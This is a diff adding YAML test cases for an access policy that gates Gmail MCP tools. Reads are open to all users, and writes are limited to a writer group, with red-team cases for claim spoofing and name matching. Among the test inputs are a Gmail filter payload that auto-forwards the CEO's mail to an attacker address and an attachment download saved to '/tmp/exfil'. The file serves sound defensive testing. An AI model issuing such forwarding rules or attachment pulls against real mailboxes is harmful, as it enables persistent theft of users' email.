@@ -1,0 +1,528 @@
+# Every deny case's expectedReason must match the sprintf output in policy.md
+# exactly (kept identical across cases for easy tuning).
+- description: Official read tool (search_threads) with no subject at all —
+    reads pass for everyone.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-search_threads
+      uri: null
+    payload:
+      name: gmail-mcp-search_threads
+      args:
+        query: from:billing has:attachment
+  output:
+    expectedResult: allow
+- description: Official read tool (get_thread, FULL_CONTENT) for a caller with
+    unrelated groups — reads pass regardless of identity.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-get_thread
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-mcp-get_thread
+      args:
+        threadId: "18c2a1b7f0d4e392"
+        messageFormat: FULL_CONTENT
+  output:
+    expectedResult: allow
+- description: GongRzhe read tool (read_email) with empty claims — still a read,
+    allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-read_email
+      uri: null
+    subject:
+      sub: auth0|carol
+      claims: {}
+    payload:
+      name: gmail-autoauth-read_email
+      args:
+        messageId: "18c2a1b7f0d4e392"
+  output:
+    expectedResult: allow
+- description: taylorwilsdon batch read (get_gmail_threads_content_batch)
+    without the writer group — high-volume but read-only, allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-get_gmail_threads_content_batch
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: google-workspace-get_gmail_threads_content_batch
+      args:
+        thread_ids:
+          - "18c2a1b7f0d4e392"
+          - "18c2a1b7f0d4e393"
+  output:
+    expectedResult: allow
+- description: Uppercased read tool name (GMAIL-MCP-LIST_DRAFTS) — matching is
+    case-insensitive, so still allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: GMAIL-MCP-LIST_DRAFTS
+      uri: null
+    payload:
+      name: GMAIL-MCP-LIST_DRAFTS
+      args: {}
+  output:
+    expectedResult: allow
+- description: GongRzhe filter read (get_filter) without the writer group —
+    reading filter definitions is allowed; only filter writes are gated.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-get_filter
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-autoauth-get_filter
+      args:
+        filterId: "ANe1Bmj7"
+  output:
+    expectedResult: allow
+- description: GongRzhe send (send_email) by a member of mcp-gmail-writers —
+    writes pass for the writer group.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-send_email
+      uri: null
+    subject:
+      sub: auth0|alice
+      claims:
+        groups:
+          - mcp-gmail-writers
+    payload:
+      name: gmail-autoauth-send_email
+      args:
+        to:
+          - vendor@example.com
+        subject: Q3 invoice
+        body: Attached.
+  output:
+    expectedResult: allow
+- description: Official label write (label_thread) when mcp-gmail-writers is one
+    of several groups — allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-label_thread
+      uri: null
+    subject:
+      sub: auth0|alice
+      claims:
+        groups:
+          - engineering
+          - mcp-gmail-writers
+    payload:
+      name: gmail-mcp-label_thread
+      args:
+        threadId: "18c2a1b7f0d4e392"
+        labelIds:
+          - Label_42
+  output:
+    expectedResult: allow
+- description: Official draft write (create_draft) by a caller whose groups do
+    not include mcp-gmail-writers — denied with the standard reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create_draft
+      uri: null
+    subject:
+      sub: auth0|alice
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-mcp-create_draft
+      args:
+        to: vendor@example.com
+        subject: Q3 invoice
+        body: Attached.
+  output:
+    expectedResult: deny
+    expectedReason: This Gmail tool can change mailbox state (draft, send, label, filter, modify, or delete), so it is restricted to members of the 'mcp-gmail-writers' group — this account has read-only Gmail access through the gateway. Ask your identity admin to add you to 'mcp-gmail-writers', or hand this step to a teammate with Gmail write access. If this tool is actually read-only, contact your InfoSec team to add it to the policy's read allowlist.
+- description: GongRzhe destructive tool (batch_delete_emails) with no subject in
+    the input at all — identity lookup fails closed, denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-batch_delete_emails
+      uri: null
+    payload:
+      name: gmail-autoauth-batch_delete_emails
+      args:
+        messageIds:
+          - "18c2a1b7f0d4e392"
+        batchSize: 50
+  output:
+    expectedResult: deny
+    expectedReason: This Gmail tool can change mailbox state (draft, send, label, filter, modify, or delete), so it is restricted to members of the 'mcp-gmail-writers' group — this account has read-only Gmail access through the gateway. Ask your identity admin to add you to 'mcp-gmail-writers', or hand this step to a teammate with Gmail write access. If this tool is actually read-only, contact your InfoSec team to add it to the policy's read allowlist.
+- description: taylorwilsdon filter write (manage_gmail_filter) with an empty
+    groups array — denied (auto-forward persistence surface).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-manage_gmail_filter
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups: []
+    payload:
+      name: google-workspace-manage_gmail_filter
+      args:
+        action: create
+        criteria:
+          from: ceo@example.com
+        filter_action:
+          forward: attacker@evil.example
+  output:
+    expectedResult: deny
+- description: get_or_create_label without the group — gated as a write despite
+    its get_ prefix (suffix matching does not confuse it with a read).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-get_or_create_label
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-autoauth-get_or_create_label
+      args:
+        labelName: Processed
+  output:
+    expectedResult: deny
+- description: taylorwilsdon label write (batch_modify_gmail_message_labels)
+    with the wrong groups — denied; its "labels" tail does not match any
+    list-labels read suffix.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: google-workspace-batch_modify_gmail_message_labels
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: google-workspace-batch_modify_gmail_message_labels
+      args:
+        message_ids:
+          - "18c2a1b7f0d4e392"
+        add_label_ids:
+          - Label_42
+  output:
+    expectedResult: deny
+- description: Unknown future tool (export_mailbox) without the group — not on
+    the read allowlist, fails closed (capability-divergence guard).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-export_mailbox
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-mcp-export_mailbox
+      args:
+        format: mbox
+  output:
+    expectedResult: deny
+- description: Uppercased write tool name (GMAIL-AUTOAUTH-SEND_EMAIL) without the
+    group — matching is case-insensitive, so still denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: GMAIL-AUTOAUTH-SEND_EMAIL
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: GMAIL-AUTOAUTH-SEND_EMAIL
+      args:
+        to:
+          - vendor@example.com
+        subject: hi
+        body: hello
+  output:
+    expectedResult: deny
+- description: groups claim is a plain string ("mcp-gmail-writers") instead of an
+    array — malformed shape fails closed, write denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-send_email
+      uri: null
+    subject:
+      sub: auth0|mallory
+      claims:
+        groups: mcp-gmail-writers
+    payload:
+      name: gmail-autoauth-send_email
+      args:
+        to:
+          - vendor@example.com
+        subject: hi
+        body: hello
+  output:
+    expectedResult: deny
+- description: Group name with wrong case (MCP-Gmail-Writers) — group matching is
+    exact (IdP group names are case-sensitive), so denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-create_label
+      uri: null
+    subject:
+      sub: auth0|mallory
+      claims:
+        groups:
+          - MCP-Gmail-Writers
+    payload:
+      name: gmail-mcp-create_label
+      args:
+        name: Processed
+  output:
+    expectedResult: deny
+- description: Non-tool ingress hook (prompt_pre_fetch) without the group — the
+    read allowlist is tool-name based, so everything else on the pipeline is
+    gated (documented limitation; attach to a Gmail-scoped pipeline).
+  input:
+    action: prompt_pre_fetch
+    kind: prompt_pre_fetch
+    mode: input
+    resource:
+      type: prompt
+      name: greeting
+      uri: null
+    payload:
+      prompt_id: greeting
+      args:
+        user: alice
+  output:
+    expectedResult: deny
+# --- Red-team review additions (standards §10) ---
+- description: "Red-team residual — download_attachment is allowlisted as a read,
+    so a non-writer can invoke it; on the GongRzhe stdio server it writes to an
+    arbitrary local savePath. Documented under Known limitations (remove from
+    read_suffixes if the local-file bridge matters). This case locks the current
+    allow behavior so the residual stays visible."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-autoauth-download_attachment
+      uri: null
+    subject:
+      sub: auth0|bob
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-autoauth-download_attachment
+      args:
+        messageId: "18c2a1b7f0d4e392"
+        attachmentId: "ANGjdJ_x"
+        savePath: /tmp/exfil
+        filename: stolen.pdf
+  output:
+    expectedResult: allow
+- description: "Red-team — claims is present but explicitly null (not an object).
+    The object.get identity chain must resolve to the default and fail closed;
+    write denied."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-send_email
+      uri: null
+    subject:
+      sub: auth0|mallory
+      claims: null
+    payload:
+      name: gmail-mcp-send_email
+      args:
+        to:
+          - vendor@example.com
+        subject: hi
+        body: hello
+  output:
+    expectedResult: deny
+    expectedReason: This Gmail tool can change mailbox state (draft, send, label, filter, modify, or delete), so it is restricted to members of the 'mcp-gmail-writers' group — this account has read-only Gmail access through the gateway. Ask your identity admin to add you to 'mcp-gmail-writers', or hand this step to a teammate with Gmail write access. If this tool is actually read-only, contact your InfoSec team to add it to the policy's read allowlist.
+- description: "Red-team — suffix over-match closed. A hypothetical write
+    `forget_thread` ends in the read suffix `get_thread` but with no boundary
+    ('-'/'_') before it, so boundary-anchored matching treats it as a write and
+    gates it (previously this over-matched and was allowed). No writer group ->
+    denied."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-forget_thread
+      uri: null
+    subject:
+      sub: auth0|mallory
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: gmail-mcp-forget_thread
+      args:
+        threadId: "18c2a1b7f0d4e392"
+  output:
+    expectedResult: deny
+    expectedReason: This Gmail tool can change mailbox state (draft, send, label, filter, modify, or delete), so it is restricted to members of the 'mcp-gmail-writers' group — this account has read-only Gmail access through the gateway. Ask your identity admin to add you to 'mcp-gmail-writers', or hand this step to a teammate with Gmail write access. If this tool is actually read-only, contact your InfoSec team to add it to the policy's read allowlist.
+- description: "Red-team — empty resource.name (missing/blank tool name) on a
+    call with no writer group. The identity chain and read check both resolve to
+    their defaults; not a read, not a writer, so the default-deny holds
+    (fail-closed on a missing tool name)."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ""
+      uri: null
+    subject:
+      sub: auth0|mallory
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: ""
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: This Gmail tool can change mailbox state (draft, send, label, filter, modify, or delete), so it is restricted to members of the 'mcp-gmail-writers' group — this account has read-only Gmail access through the gateway. Ask your identity admin to add you to 'mcp-gmail-writers', or hand this step to a teammate with Gmail write access. If this tool is actually read-only, contact your InfoSec team to add it to the policy's read allowlist.
+- description: "Red-team — bare (unprefixed) read tool name `search_threads` with
+    no server prefix and no subject. Boundary-anchored matching allows an exact
+    bare suffix, so portability to a no-prefix gateway is preserved; allowed."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: search_threads
+      uri: null
+    payload:
+      name: search_threads
+      args:
+        query: from:billing
+  output:
+    expectedResult: allow
+- description: "Red-team — groups claim is an object/map rather than an array
+    (attempted claim-shape spoof). Iterating the map yields values, none of which
+    equal the writer group; fails closed, write denied."
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: gmail-mcp-send_email
+      uri: null
+    subject:
+      sub: auth0|mallory
+      claims:
+        groups:
+          mcp-gmail-writers: true
+    payload:
+      name: gmail-mcp-send_email
+      args:
+        to:
+          - vendor@example.com
+        subject: hi
+        body: hello
+  output:
+    expectedResult: deny
+    expectedReason: This Gmail tool can change mailbox state (draft, send, label, filter, modify, or delete), so it is restricted to members of the 'mcp-gmail-writers' group — this account has read-only Gmail access through the gateway. Ask your identity admin to add you to 'mcp-gmail-writers', or hand this step to a teammate with Gmail write access. If this tool is actually read-only, contact your InfoSec team to add it to the policy's read allowlist.
